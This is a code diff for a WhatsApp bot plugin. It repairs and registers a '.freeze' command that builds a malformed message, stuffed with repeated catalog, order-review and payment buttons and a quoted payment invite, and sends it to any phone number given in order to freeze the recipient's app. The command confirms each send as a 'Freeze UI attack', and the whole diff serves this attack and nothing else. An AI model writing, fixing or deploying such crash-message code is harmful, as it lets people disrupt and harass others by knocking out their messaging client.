@@ -1,7 +1,6 @@
 const { cmd } = require('../inconnuboy');
 
-// The FreezeUi function (keep as is)
-async function FreezeUi(target) {
+async function FreezeUi(sock, target) {
   const Node = [
     {
       tag: "bot",
@@ -17,13 +16,13 @@ async function FreezeUi(target) {
 
   for (let i = 0; i < 10; i++) {
     ButtonsFreeze.push(
-      { name: "cta_catalog",    buttonParamsJson: JSON.stringify({ status: true }) },
-      { name: "review_order",    buttonParamsJson: JSON.stringify({ status: true }) },
+      { name: "cta_catalog", buttonParamsJson: JSON.stringify({ status: true }) },
+      { name: "review_order", buttonParamsJson: JSON.stringify({ status: true }) },
       { name: "review_and_pay", buttonParamsJson: JSON.stringify({ status: true }) }
     );
   }
 
-  const msg = await generateWAMessageFromContent(target, {
+  const msg = await sock.generateWAMessageFromContent(target, {
     viewOnceMessage: {
       message: {
         messageContextInfo: {
@@ -42,7 +41,6 @@ async function FreezeUi(target) {
             participant: target,
             mentionedJid: [target],
             remoteJid: "X",
-            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
             stanzaId: "123",
             quotedMessage: {
               paymentInviteMessage: {
@@ -99,15 +97,14 @@ async function FreezeUi(target) {
   console.log(chalk.red(`Success Sending Bug FreezeUiCrL To Target`));
 }
 
-// Command registration with your inconnuboy structure
+// Command registration
 cmd({
     pattern: "freeze",
     desc: "Send freeze UI bug to a target",
-    category: "tools",
+    category: "bugs",
     react: "❄️",
     filename: __filename
 }, async (conn, mek, msg, { from, reply, sender, args, q, isGroup, botNumber }) => {
-    // Get target number from args or reply
     let target = args[0];
     
     if (!target && msg.quoted) {
@@ -118,16 +115,15 @@ cmd({
         return reply("❌ Please provide a target number or reply to a user's message\n\nExample: .freeze 1234567890");
     }
     
-    // Format number if needed
     if (!target.includes('@')) {
         target = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
     }
     
     try {
-        await FreezeUi(target);
+        await FreezeUi(conn, target); // Pass conn (sock object)
         reply(`✅ Freeze UI attack sent to ${target.split('@')[0]}`);
     } catch (error) {
         console.error(error);
         reply(`❌ Error: ${error.message}`);
     }
-});t
+});
